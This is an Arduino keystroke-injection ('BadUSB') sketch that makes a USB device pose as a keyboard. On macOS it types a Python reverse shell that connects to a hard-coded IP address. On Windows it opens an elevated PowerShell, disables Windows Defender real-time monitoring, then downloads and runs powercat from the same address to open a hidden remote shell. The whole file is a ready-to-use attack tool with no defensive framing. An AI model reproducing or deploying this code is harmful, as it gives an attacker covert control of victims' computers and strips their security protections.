#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);
  delay(600);
  // Write shells for MACOSx
  pinMode(3,INPUT_PULLUP);
  if(digitalRead(3)==LOW){
//    Keyboard.print(F("I am the button"));
  delay(300);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print(F("terminal"));
  delay(400);
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print(F("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"142.93.121.236\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"));
  delay(200);
  typeKey(KEY_RETURN);
  delay(200);
  typeKey(KEY_RETURN);
  }
  // Windows 10: Disable Windows Defender with Powershell
  // Author: Judge2020
  // 
  // let the HID enumerate
  // write shells for Windows Environment
  else{
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  // my best attempt at a elevated powershell instance
  Keyboard.print(F("powershell Start-Process powershell -Verb runAs"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print(F("Set-MpPreference -DisableRealtimeMonitoring $true"));
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print(F("powershell -windowstyle hidden -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://142.93.121.236/powercat.ps1');powercat -c 142.93.121.236 -p 1234 -e powershell\""));
  typeKey(KEY_RETURN);
  Keyboard.print(F("exit"));
  typeKey(KEY_RETURN);
  }
  
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
